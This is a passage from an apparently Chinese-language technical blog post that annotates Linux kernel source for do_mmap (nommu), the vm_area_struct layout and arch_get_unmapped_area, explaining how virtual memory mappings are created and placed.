class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">do_mmap</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> prot,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">vm_flags_t</span> vm_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">long</span> *populate,</span></span></span><br><span class="line"><span class="params"><span class="function">			struct list_head *uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span> <span class="comment">/* Linux中vm_area_struct表示的虚拟地址是给进程使用的(vm_struct表示的虚拟地址是给内核使用的) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">region</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> capabilities, result;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	*populate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* decide whether we should attempt the mapping, and if so what sort of</span></span><br><span class="line"><span class="comment">	 * mapping */</span></span><br><span class="line">	ret = validate_mmap_request(file, addr, len, prot, flags, pgoff,</span><br><span class="line">				    &amp;capabilities); <span class="comment">/* 用于决定是否应该尝试映射 */</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we ignore the address hint */</span></span><br><span class="line">	addr = <span class="number">0</span>;</span><br><span class="line">	len = PAGE_ALIGN(len);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;ve determined that we can make the mapping, now translate what we</span></span><br><span class="line"><span class="comment">	 * now know into VMA flags */</span></span><br><span class="line">	vm_flags |= determine_vm_flags(file, prot, flags, capabilities); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;re going to need to record the mapping */</span></span><br><span class="line">	region = kmem_cache_zalloc(vm_region_jar, GFP_KERNEL); <span class="comment">/* 记录映射(kmem_cache_zalloc除了分配内存对象之外,还把内存对象所代表的内存空间初始化为&quot;0&quot;) */</span></span><br><span class="line">	<span class="keyword">if</span> (!region)</span><br><span class="line">		<span class="keyword">goto</span> error_getting_region;</span><br><span class="line"></span><br><span class="line">	vma = vm_area_alloc(current-&gt;mm); <span class="comment">/* 调用kmem_cache_alloc分配新的vma,然后调用vma_init进行初始化 */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma)</span><br><span class="line">		<span class="keyword">goto</span> error_getting_vma;</span><br><span class="line"></span><br><span class="line">	region-&gt;vm_usage = <span class="number">1</span>; <span class="comment">/* 设置vm_region */</span></span><br><span class="line">	region-&gt;vm_flags = vm_flags;</span><br><span class="line">	region-&gt;vm_pgoff = pgoff;</span><br><span class="line">	</span><br><span class="line">	vma-&gt;vm_flags = vm_flags; <span class="comment">/* 设置vm_area_struct */</span></span><br><span class="line">	vma-&gt;vm_pgoff = pgoff;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (file) &#123; <span class="comment">/* 这里的file就是通过mmap的参数&#x27;fd&#x27;得来的 */</span></span><br><span class="line">		region-&gt;vm_file = get_file(file);</span><br><span class="line">		vma-&gt;vm_file = get_file(file);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;nommu_region_sem);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if we want to share, we need to check for regions created by other</span></span><br><span class="line"><span class="comment">	 * mmap() calls that overlap with our proposed mapping</span></span><br><span class="line"><span class="comment">	 * - we can only share with a superset match on most regular files</span></span><br><span class="line"><span class="comment">	 * - shared mappings on character devices and memory backed files are</span></span><br><span class="line"><span class="comment">	 *   permitted to overlap inexactly as far as we are concerned for in</span></span><br><span class="line"><span class="comment">	 *   these cases, sharing is handled in the driver or filesystem rather</span></span><br><span class="line"><span class="comment">	 *   than here</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (vm_flags &amp; VM_MAYSHARE) &#123; <span class="comment">/* VM_MAYSHARE:用于确定是否可以设置对应的VM_SHARED(可以被多个进程共享) */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">pregion</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> pglen, rpglen, pgend, rpgend, start;</span><br><span class="line"></span><br><span class="line">		pglen = (len + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT;</span><br><span class="line">		pgend = pgoff + pglen;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (rb = rb_first(&amp;nommu_region_tree); rb; rb = rb_next(rb)) &#123;</span><br><span class="line">			pregion = rb_entry(rb, struct vm_region, vm_rb);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!(pregion-&gt;vm_flags &amp; VM_MAYSHARE))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* search for overlapping mappings on the same file */</span></span><br><span class="line">			<span class="keyword">if</span> (file_inode(pregion-&gt;vm_file) !=</span><br><span class="line">			    file_inode(file)) </span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (pregion-&gt;vm_pgoff &gt;= pgend)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			rpglen = pregion-&gt;vm_end - pregion-&gt;vm_start;</span><br><span class="line">			rpglen = (rpglen + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT;</span><br><span class="line">			rpgend = pregion-&gt;vm_pgoff + rpglen;</span><br><span class="line">			<span class="keyword">if</span> (pgoff &gt;= rpgend)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* handle inexactly overlapping matches between</span></span><br><span class="line"><span class="comment">			 * mappings */</span></span><br><span class="line">			<span class="keyword">if</span> ((pregion-&gt;vm_pgoff != pgoff || rpglen != pglen) &amp;&amp;</span><br><span class="line">			    !(pgoff &gt;= pregion-&gt;vm_pgoff &amp;&amp; pgend &lt;= rpgend)) &#123;</span><br><span class="line">				<span class="comment">/* new mapping is not a subset of the region */</span></span><br><span class="line">				<span class="keyword">if</span> (!(capabilities &amp; NOMMU_MAP_DIRECT))</span><br><span class="line">					<span class="keyword">goto</span> sharing_violation;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* we&#x27;ve found a region we can share */</span></span><br><span class="line">			pregion-&gt;vm_usage++;</span><br><span class="line">			vma-&gt;vm_region = pregion; <span class="comment">/* 设置vm_area_struct */</span></span><br><span class="line">			start = pregion-&gt;vm_start;</span><br><span class="line">			start += (pgoff - pregion-&gt;vm_pgoff) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">			vma-&gt;vm_start = start;</span><br><span class="line">			vma-&gt;vm_end = start + len;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (pregion-&gt;vm_flags &amp; VM_MAPPED_COPY)</span><br><span class="line">				vma-&gt;vm_flags |= VM_MAPPED_COPY;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				ret = do_mmap_shared_file(vma); <span class="comment">/* 在文件上设置共享映射(驱动程序或文件系统提供并固定存储) */</span></span><br><span class="line">				<span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					vma-&gt;vm_region = <span class="literal">NULL</span>;</span><br><span class="line">					vma-&gt;vm_start = <span class="number">0</span>;</span><br><span class="line">					vma-&gt;vm_end = <span class="number">0</span>;</span><br><span class="line">					pregion-&gt;vm_usage--;</span><br><span class="line">					pregion = <span class="literal">NULL</span>;</span><br><span class="line">					<span class="keyword">goto</span> error_just_free;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			fput(region-&gt;vm_file);</span><br><span class="line">			kmem_cache_free(vm_region_jar, region);</span><br><span class="line">			region = pregion;</span><br><span class="line">			result = start;</span><br><span class="line">			<span class="keyword">goto</span> share;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* obtain the address at which to make a shared mapping</span></span><br><span class="line"><span class="comment">		 * - this is the hook for quasi-memory character devices to</span></span><br><span class="line"><span class="comment">		 *   tell us the location of a shared mapping</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (capabilities &amp; NOMMU_MAP_DIRECT) &#123;</span><br><span class="line">			addr = file-&gt;f_op-&gt;get_unmapped_area(file, addr, len,</span><br><span class="line">							     pgoff, flags); </span><br><span class="line">            <span class="comment">/* get_unmapped_area调用的是&quot;current-&gt;mm-&gt;get_unmapped_area&quot;,在不同体系结构上对应不同的函数,但这些函数的基本原理都是类似的 */</span></span><br><span class="line">			<span class="keyword">if</span> (IS_ERR_VALUE(addr)) &#123;</span><br><span class="line">				ret = addr;</span><br><span class="line">				<span class="keyword">if</span> (ret != -ENOSYS)</span><br><span class="line">					<span class="keyword">goto</span> error_just_free;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* the driver refused to tell us where to site</span></span><br><span class="line"><span class="comment">				 * the mapping so we&#x27;ll have to attempt to copy</span></span><br><span class="line"><span class="comment">				 * it */</span></span><br><span class="line">				ret = -ENODEV;</span><br><span class="line">				<span class="keyword">if</span> (!(capabilities &amp; NOMMU_MAP_COPY))</span><br><span class="line">					<span class="keyword">goto</span> error_just_free;</span><br><span class="line"></span><br><span class="line">				capabilities &amp;= ~NOMMU_MAP_DIRECT;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				vma-&gt;vm_start = region-&gt;vm_start = addr;</span><br><span class="line">				vma-&gt;vm_end = region-&gt;vm_end = addr + len;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vma-&gt;vm_region = region;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the mapping</span></span><br><span class="line"><span class="comment">	 * - the region is filled in if NOMMU_MAP_DIRECT is still set</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (file &amp;&amp; vma-&gt;vm_flags &amp; VM_SHARED) <span class="comment">/* VM_SHARED:可以被多个进程共享 */</span></span><br><span class="line">		ret = do_mmap_shared_file(vma); <span class="comment">/* 在文件上设置共享映射(驱动程序或文件系统提供并固定存储) */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = do_mmap_private(vma, region, len, capabilities); <span class="comment">/* 设置私有映射或匿名共享映射 */</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error_just_free;</span><br><span class="line">	add_nommu_region(region);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* clear anonymous mappings that don&#x27;t ask for uninitialized data */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_file &amp;&amp; !(flags &amp; MAP_UNINITIALIZED)) <span class="comment">/* 清除不要求未初始化数据的匿名映射 */</span></span><br><span class="line">		<span class="built_in">memset</span>((<span class="keyword">void</span> *)region-&gt;vm_start, <span class="number">0</span>,</span><br><span class="line">		       region-&gt;vm_end - region-&gt;vm_start);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* okay... we have a mapping; now we have to register it */</span></span><br><span class="line">	result = vma-&gt;vm_start;</span><br><span class="line"></span><br><span class="line">	current-&gt;mm-&gt;total_vm += len &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">share:</span><br><span class="line">	add_vma_to_mm(current-&gt;mm, vma); <span class="comment">/* 在list和tree的适当位置将VMA添加到进程的mm_struct中,如果不是匿名页面,也添加到地址空间的页面树中 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we flush the region from the icache only when the first executable</span></span><br><span class="line"><span class="comment">	 * mapping of it is made  */</span></span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_EXEC &amp;&amp; !region-&gt;vm_icache_flushed) &#123;</span><br><span class="line">		flush_icache_range(region-&gt;vm_start, region-&gt;vm_end);</span><br><span class="line">		region-&gt;vm_icache_flushed = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	up_write(&amp;nommu_region_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">error_just_free:</span><br><span class="line">	up_write(&amp;nommu_region_sem);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">if</span> (region-&gt;vm_file)</span><br><span class="line">		fput(region-&gt;vm_file);</span><br><span class="line">	kmem_cache_free(vm_region_jar, region);</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_file)</span><br><span class="line">		fput(vma-&gt;vm_file);</span><br><span class="line">	vm_area_free(vma);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">sharing_violation:</span><br><span class="line">	up_write(&amp;nommu_region_sem);</span><br><span class="line">	pr_warn(<span class="string">&quot;Attempt to share mismatched mappings\n&quot;</span>);</span><br><span class="line">	ret = -EINVAL;</span><br><span class="line">	<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">error_getting_vma:</span><br><span class="line">	kmem_cache_free(vm_region_jar, region);</span><br><span class="line">	pr_warn(<span class="string">&quot;Allocation of vma for %lu byte allocation from process %d failed\n&quot;</span>,</span><br><span class="line">			len, current-&gt;pid);</span><br><span class="line">	show_free_areas(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">error_getting_region:</span><br><span class="line">	pr_warn(<span class="string">&quot;Allocation of vm region for %lu byte allocation from process %d failed\n&quot;</span>,</span><br><span class="line">			len, current-&gt;pid);</span><br><span class="line">	show_free_areas(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先调用 <code>vm_area_alloc</code>（底层还是调用 <code>kmem_cache_alloc</code>，然后调用 <code>vma_init</code> 把该 <code>vma</code> 插入红黑树）</li>
<li>新分配的 <code>vm_area_struct</code> 用于管理进程使用的虚拟地址（虚存管理的最基本的管理单元）：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/* The first cache line has the info for VMA tree walking. */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;		<span class="comment">/* Our start address within vm_mm. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;		<span class="comment">/* The first byte after our end address</span></span><br><span class="line"><span class="comment">					   within vm_mm. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Largest free memory gap in bytes to the left of this VMA.</span></span><br><span class="line"><span class="comment">	 * Either between this VMA and vma-&gt;vm_prev, or between one of the</span></span><br><span class="line"><span class="comment">	 * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps</span></span><br><span class="line"><span class="comment">	 * get_unmapped_area find a free area of the right size.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_gap;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Second cache line starts here. */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span>	<span class="comment">/* The address space we belong to. */</span></span><br><span class="line">	<span class="keyword">pgprot_t</span> vm_page_prot;		<span class="comment">/* Access permissions of this VMA. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;		<span class="comment">/* Flags, see mm.h. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">	 * linkage into the address_space-&gt;i_mmap interval tree.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_last;</span><br><span class="line">	&#125; shared;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">	 * list, after a COW of one of the file pages.	A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">	 * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">	 * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_chain</span>;</span> <span class="comment">/* Serialized by mmap_sem &amp;</span></span><br><span class="line"><span class="comment">					  * page_table_lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>	<span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Information about our backing store: */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;		<span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">					   units */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>		<span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">	<span class="keyword">void</span> * vm_private_data;		<span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">atomic_long_t</span> swap_readahead_info;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>	<span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>	<span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_userfaultfd_ctx</span> <span class="title">vm_userfaultfd_ctx</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">core_thread</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">core_thread</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">core_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span> nr_threads;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">core_thread</span> <span class="title">dumper</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> <span class="title">startup</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>核心函数 <code>get_unmapped_area</code> 调用的是 <code>current-&gt;mm-&gt;get_unmapped_area</code>，在 Linux 中，实际上调用的是 <code>arch_get_unmapped_area</code>（进程中能够找到查找空闲虚拟内存的方法）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">mmap_allocation_direction</span> &#123;</span>UP, DOWN&#125;; <span class="comment">/* UP == &#x27;0&#x27;, DOWN == &#x27;1&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">arch_get_unmapped_area</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr0,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> arch_get_unmapped_area_common(filp,</span><br><span class="line">			addr0, len, pgoff, flags, UP); <span class="comment">/* addr0 == &#x27;0&#x27; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">arch_get_unmapped_area_common</span><span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr0, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">enum</span> mmap_allocation_direction dir)</span> <span class="comment">/* dir == UP */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = addr0;</span><br><span class="line">	<span class="keyword">int</span> do_color_align;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_unmapped_area_info</span> <span class="title">info</span>;</span> <span class="comment">/* 用于管理分配内存请求 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(len &gt; TASK_SIZE))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_FIXED) &#123;</span><br><span class="line">		<span class="comment">/* Even MAP_FIXED mappings must reside within TASK_SIZE */</span></span><br><span class="line">		<span class="keyword">if</span> (TASK_SIZE - len &lt; addr)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We do not accept a shared mapping if it would violate</span></span><br><span class="line"><span class="comment">		 * cache aliasing constraints.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ((flags &amp; MAP_SHARED) &amp;&amp;</span><br><span class="line">		    ((addr - (pgoff &lt;&lt; PAGE_SHIFT)) &amp; shm_align_mask))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">return</span> addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	do_color_align = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (filp || (flags &amp; MAP_SHARED))</span><br><span class="line">		do_color_align = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* requesting a specific address */</span></span><br><span class="line">	<span class="keyword">if</span> (addr) &#123;</span><br><span class="line">		<span class="keyword">if</span> (do_color_align)</span><br><span class="line">			addr = COLOUR_ALIGN(addr, pgoff);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			addr = PAGE_ALIGN(addr);</span><br><span class="line"></span><br><span class="line">		vma = find_vma(mm, addr); <span class="comment">/* 找到对应的vma 